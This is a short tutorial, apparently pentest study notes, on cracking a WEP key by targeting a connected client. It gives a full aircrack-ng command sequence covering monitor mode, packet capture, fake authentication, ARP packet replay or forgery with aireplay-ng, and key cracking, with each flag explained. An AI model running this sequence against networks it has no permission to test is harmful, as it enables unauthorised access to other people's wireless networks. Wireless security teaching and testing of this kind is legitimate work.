# Cracking WEP via client 

Most times crack WEP by attacking the access point. In this scenario, we attack WEP via the client. The reasons for doing so are as follows: 

Some APs max out at 130k unique IVs
Some APs impose client-to-client controls
MAC address access controls
APs that eliminate weak IVs
You can’t successfully do a fake authentication to the AP
You are within range of the client but not the AP itself


## Attack 

Put the wireless card into monitor mode 
Capture the packets on a specific channel with a specific bssif and write it to a file 
Always good practise to conduct a fake authentication attack against the AP as having the MAC associated with the access point makes the attack more reliable. 

```
airmon-ng start <interface> <AP Channel>
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
```

We can either filter for the correct packets to replay, or we can modify packets. 

### Filter for the correct packet to replay 

```
aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -t 1 <interface>
```

Where:
-2: interactive packet replay
-b: AP MAC address
-d FF:FF:FF:FF:FF:FF: select packets with a broadcast destination address
-t 1: select packets with the “To Distribution System” flag set
<interface>: the monitor mode interface

### Modify packets to replay 


```
aireplay-ng -2 -b <AP MAC> -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 <interface>
```

where:

-2: interactive packet replay
-b: AP MAC address
-t 1: select packets with the ‘To Distribution System” flag set
-c FF:FF:FF:FF:FF:FF: modify the destination MAC to the broadcast address
-p 0841: set the Frame Control Field so the packet appears to come from a client
<interface>: the monitor mode interface

### Specific filtering for ARP packets originating from the Distribution System 

```
aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
```

-2: interactive packet replay
-b: MAC address of AP
-d FF:FF:FF:FF:FF:FF: destination set to the broadcast address
-f 1: filter for packets with the “From Distribution System” flag set
-m 68: the minimum packet size to look for (typical min value for ARP is 68)
-n 86: the maximum packet size to look for (typical max value for ARP is 86)
<interface>: the monitor mode interface


## Summary 

Place your wireless card into monitor mode on the AP channel:
Start a capture dump, filtering on the AP channel and BSSID, saving the capture to a file:
Next, conduct a fake authentication against the access point:
Launch the interactive packet replay attack looking for ARP packets coming from the AP:
Once enough IVs have been captured, crack the WEP key:

```
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
aircrack-ng -z <capture>
```

